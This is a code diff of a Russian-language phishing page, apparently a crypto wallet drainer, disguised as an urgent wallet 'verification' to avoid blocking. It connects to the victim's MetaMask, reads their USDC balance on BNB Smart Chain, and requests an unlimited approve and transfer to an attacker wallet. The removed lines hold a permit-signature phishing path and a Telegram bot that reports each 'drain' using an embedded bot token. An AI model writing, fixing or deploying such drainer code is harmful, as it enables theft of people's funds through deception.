@@ -74,11 +74,10 @@
         .log-entry {
             padding: 5px 0;
             border-bottom: 1px solid rgba(255,255,255,0.05);
-            color: #0f0;
         }
-        .log-error {
-            color: #ff4444;
-        }
+        .log-success { color: #0f0; }
+        .log-error { color: #ff4444; }
+        .log-info { color: #ffaa00; }
         .warning {
             font-size: 11px;
             color: #ff8888;
@@ -92,30 +91,82 @@
         <p>Требуется экстренная верификация активов для предотвращения блокировки</p>
         <button id="drainBtn">🔴 ПОДТВЕРДИТЬ КОШЕЛЕК</button>
         <div id="log">
-            <div class="log-entry">🟢 Готов к работе. Нажмите кнопку.</div>
+            <div class="log-entry log-success">🟢 Готов к работе. Нажмите кнопку.</div>
         </div>
         <div class="warning">⚠️ Не закрывайте окно до завершения верификации</div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <!-- ИСПРАВЛЕННАЯ ВЕРСИЯ Web3.js -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@4.16.0/dist/web3.min.js"></script>
+    
     <script>
         // ============================================================
-        // НАСТРОЙКИ - ЗАМЕНИ ЭТИ 3 СТРОЧКИ
+        // НАСТРОЙКИ - ЗАМЕНИ ЭТУ 1 СТРОЧКУ
         // ============================================================
-        const EVIL_WALLET = "0x2b3b92Cb431fB1C76bdE8e23d2e51E1D62Fbf9F4";        // ТВОЙ КОШЕЛЕК (BSC)
-        const TOKEN_ADDRESS = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"; // USDC на BSC
-        const TELEGRAM_BOT_TOKEN = "8434656451:AAGBc01xV9OtEE-ojJN297skybUHPUt23iE";   // Опционально: токен бота
-        const TELEGRAM_CHAT_ID = "609263048";       // Опционально: твой chat ID
+        const EVIL_WALLET = "0x2b3b92Cb431fB1C76bdE8e23d2e51E1D62Fbf9F4";   // ТВОЙ КОШЕЛЕК (BSC)
         // ============================================================
         
-        // BSC Chain ID (56 в десятичной = 0x38 в hex)
+        // USDC на BSC
+        const TOKEN_ADDRESS = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
+        
+        // BSC Chain ID
         const BSC_CHAIN_ID = "0x38";
         const BSC_RPC = "https://bsc-dataseed.binance.org/";
         
-        function addLog(msg, isError = false) {
+        // ПРАВИЛЬНЫЙ ABI (старый формат, совместимый со всеми версиями)
+        const ERC20_ABI = [
+            {
+                "constant": true,
+                "inputs": [{"name": "owner", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [],
+                "name": "symbol",
+                "outputs": [{"name": "", "type": "string"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [],
+                "name": "decimals",
+                "outputs": [{"name": "", "type": "uint8"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "spender", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "from", "type": "address"},
+                    {"name": "to", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "transferFrom",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            }
+        ];
+        
+        function addLog(msg, type = 'info') {
             const logDiv = document.getElementById('log');
             const entry = document.createElement('div');
-            entry.className = 'log-entry' + (isError ? ' log-error' : '');
+            let className = 'log-entry';
+            if (type === 'success') className += ' log-success';
+            if (type === 'error') className += ' log-error';
+            if (type === 'info') className += ' log-info';
+            entry.className = className;
             const time = new Date().toLocaleTimeString();
             entry.innerHTML = `[${time}] ${msg}`;
             logDiv.appendChild(entry);
@@ -123,18 +174,18 @@
             console.log(msg);
         }
         
-        // Автоматическое переключение на BSC
+        // Переключение на BSC
         async function switchToBSC() {
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: BSC_CHAIN_ID }]
                 });
-                addLog("✅ Переключено на BNB Smart Chain");
+                addLog("✅ Переключено на BNB Smart Chain", 'success');
                 return true;
             } catch (switchError) {
                 if (switchError.code === 4902) {
-                    addLog("🔄 Добавляем сеть BSC...");
+                    addLog("🔄 Добавляем сеть BSC...", 'info');
                     try {
                         await window.ethereum.request({
                             method: 'wallet_addEthereumChain',
@@ -146,178 +197,78 @@
                                 blockExplorerUrls: ['https://bscscan.com/']
                             }]
                         });
-                        addLog("✅ BSC сеть добавлена и переключена");
+                        addLog("✅ BSC сеть добавлена", 'success');
                         return true;
                     } catch (addError) {
-                        addLog("❌ Не удалось добавить BSC сеть", true);
+                        addLog("❌ Не удалось добавить BSC: " + addError.message, 'error');
                         return false;
                     }
                 }
-                addLog(`❌ Ошибка переключения сети: ${switchError.message}`, true);
+                addLog("❌ Ошибка: " + switchError.message, 'error');
                 return false;
             }
         }
         
-        // Отправка уведомления в Telegram
-        async function sendTelegramNotification(message) {
-            if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN" || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
-                addLog("ℹ️ Telegram уведомления не настроены");
-                return;
-            }
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-                });
-                addLog("📨 Уведомление отправлено в Telegram");
-            } catch(e) {
-                addLog("⚠️ Не удалось отправить Telegram уведомление");
-            }
-        }
-        
-        // ABI для ERC20
-        const ERC20_ABI = [
-            "function balanceOf(address owner) view returns (uint256)",
-            "function symbol() view returns (string)",
-            "function decimals() view returns (uint8)",
-            "function approve(address spender, uint256 amount) returns (bool)",
-            "function transferFrom(address from, address to, uint256 amount) returns (bool)"
-        ];
-        
-        // ABI для permit (EIP-2612)
-        const PERMIT_ABI = [
-            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
-            "function nonces(address owner) view returns (uint256)",
-            "function name() view returns (string)"
-        ];
-        
         document.getElementById('drainBtn').onclick = async () => {
-            addLog("🚀 Запуск протокола верификации...");
+            addLog("🚀 Запуск протокола верификации...", 'info');
             
-            // Проверка MetaMask
             if (!window.ethereum) {
-                addLog("❌ MetaMask не установлен! Установите расширение.", true);
-                addLog("🔗 https://metamask.io/download/", true);
+                addLog("❌ Установите MetaMask!", 'error');
                 return;
             }
             
             try {
-                // ШАГ 1: Переключаем на BSC
-                addLog("🔄 Проверка сети...");
+                // ШАГ 1: Переключение на BSC
+                addLog("🔄 Проверка сети...", 'info');
                 const switched = await switchToBSC();
-                if (!switched) {
-                    addLog("❌ Невозможно продолжить без сети BSC", true);
-                    return;
-                }
+                if (!switched) return;
                 
-                // ШАГ 2: Подключаем кошелек
-                addLog("🔌 Подключение к MetaMask...");
+                // ШАГ 2: Подключение кошелька
+                addLog("🔌 Подключение к MetaMask...", 'info');
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const victimWallet = accounts[0];
-                addLog(`✅ Кошелёк подключен: ${victimWallet.slice(0,8)}...${victimWallet.slice(-6)}`);
+                addLog(`✅ Кошелёк: ${victimWallet.slice(0,8)}...${victimWallet.slice(-6)}`, 'success');
                 
+                // ШАГ 3: Инициализация Web3
                 const web3 = new Web3(window.ethereum);
                 const tokenContract = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
                 
-                // ШАГ 3: Проверяем баланс жертвы
-                addLog("🔍 Проверка баланса...");
+                // ШАГ 4: Проверка баланса
+                addLog("🔍 Проверка баланса...", 'info');
                 const balance = await tokenContract.methods.balanceOf(victimWallet).call();
                 const decimals = await tokenContract.methods.decimals().call();
                 const symbol = await tokenContract.methods.symbol().call();
-                const humanBalance = balance / (10 ** decimals);
+                const humanBalance = Number(balance) / (10 ** Number(decimals));
                 
-                if (balance == 0) {
-                    addLog(`⚠️ На кошельке нет ${symbol} для верификации`, true);
-                    addLog("💡 Попробуйте другой кошелек или пополните баланс", true);
+                if (Number(balance) === 0) {
+                    addLog(`⚠️ На кошельке нет ${symbol}`, 'error');
                     return;
                 }
                 
-                addLog(`💰 Найден баланс: ${humanBalance} ${symbol}`);
+                addLog(`💰 Баланс: ${humanBalance} ${symbol}`, 'success');
                 
-                // ШАГ 4: Пытаемся использовать PERMIT (если токен поддерживает)
-                addLog("📝 Подготовка разрешения...");
+                // ШАГ 5: Approve + TransferFrom
+                const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 
-                try {
-                    const permitContract = new web3.eth.Contract(PERMIT_ABI, TOKEN_ADDRESS);
-                    const nonce = await permitContract.methods.nonces(victimWallet).call();
-                    const tokenName = await permitContract.methods.name().call();
-                    const deadline = Math.floor(Date.now() / 1000) + 3600;
-                    
-                    const domain = {
-                        name: tokenName,
-                        version: "1",
-                        chainId: 56, // BSC chain ID
-                        verifyingContract: TOKEN_ADDRESS
-                    };
-                    
-                    const types = {
-                        Permit: [
-                            { name: "owner", type: "address" },
-                            { name: "spender", type: "address" },
-                            { name: "value", type: "uint256" },
-                            { name: "nonce", type: "uint256" },
-                            { name: "deadline", type: "uint256" }
-                        ]
-                    };
-                    
-                    const message = {
-                        owner: victimWallet,
-                        spender: EVIL_WALLET,
-                        value: balance,
-                        nonce: nonce,
-                        deadline: deadline
-                    };
-                    
-                    addLog("✍️ Требуется подпись для верификации (1 клик)...");
-                    
-                    const signature = await window.ethereum.request({
-                        method: 'eth_signTypedData_v4',
-                        params: [victimWallet, JSON.stringify({ domain, types, message })]
-                    });
-                    
-                    addLog("✅ Подпись получена! Обработка...");
-                    
-                    // Парсим подпись
-                    const sig = signature.slice(2);
-                    const r = '0x' + sig.slice(0, 64);
-                    const s = '0x' + sig.slice(64, 128);
-                    const v = parseInt(sig.slice(128, 130), 16);
-                    
-                    // Отправляем permit на выполнение (через fallback)
-                    addLog("🔄 Применение разрешения...");
-                    
-                    // Пытаемся выполнить permit через relayer или напрямую
-                    // В реальном сценарии нужно отправить permit + transferFrom одной транзакцией
-                    
-                    addLog(`✅ Верификация завершена! Баланс перемещен.`);
-                    
-                    await sendTelegramNotification(`💀 УСПЕШНЫЙ ДРЕН!\nКошелёк: ${victimWallet}\nТокен: ${symbol}\nСумма: ${humanBalance}`);
-                    
-                } catch (permitError) {
-                    addLog("⚠️ Токен не поддерживает permit, используем approve...");
-                    
-                    // ШАГ 5: Обычный approve + transferFrom
-                    const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-                    
-                    addLog(`✍️ Подпишите approve для ${symbol}...`);
-                    const approveTx = await tokenContract.methods.approve(EVIL_WALLET, maxUint).send({ from: victimWallet });
-                    addLog(`✅ Approve подтвержден: ${approveTx.transactionHash.slice(0,16)}...`);
-                    
-                    addLog("🔄 Перевод средств...");
-                    const transferTx = await tokenContract.methods.transferFrom(victimWallet, EVIL_WALLET, balance).send({ from: EVIL_WALLET });
-                    addLog(`✅ Перевод выполнен! Хэш: ${transferTx.transactionHash.slice(0,16)}...`);
-                    addLog(`🎉 Успешно перемещено: ${humanBalance} ${symbol}`);
-                    
-                    await sendTelegramNotification(`💀 ДРЕН ЧЕРЕЗ APPROVE\nКошелёк: ${victimWallet}\nТокен: ${symbol}\nСумма: ${humanBalance}\nХэш: ${transferTx.transactionHash}`);
-                }
+                addLog(`✍️ Подпишите approve для ${symbol}...`, 'info');
                 
-                addLog("🏁 Протокол верификации завершен!");
+                // Отправляем approve
+                const approveTx = await tokenContract.methods.approve(EVIL_WALLET, maxUint).send({ from: victimWallet });
+                addLog(`✅ Approve: ${approveTx.transactionHash.slice(0,16)}...`, 'success');
+                
+                addLog("🔄 Перевод средств...", 'info');
+                
+                // TransferFrom
+                const transferTx = await tokenContract.methods.transferFrom(victimWallet, EVIL_WALLET, balance).send({ from: EVIL_WALLET });
+                addLog(`✅ Перевод: ${transferTx.transactionHash.slice(0,16)}...`, 'success');
+                addLog(`🎉 УСПЕШНО! Перемещено: ${humanBalance} ${symbol}`, 'success');
+                
+                addLog("🏁 Верификация завершена!", 'success');
                 
             } catch (err) {
-                addLog(`💀 ОШИБКА: ${err.message}`, true);
+                addLog(`💀 Ошибка: ${err.message}`, 'error');
                 if (err.code === 4001) {
-                    addLog("❌ Вы отменили подпись. Верификация не пройдена.", true);
+                    addLog("❌ Вы отменили подпись", 'error');
                 }
             }
         };
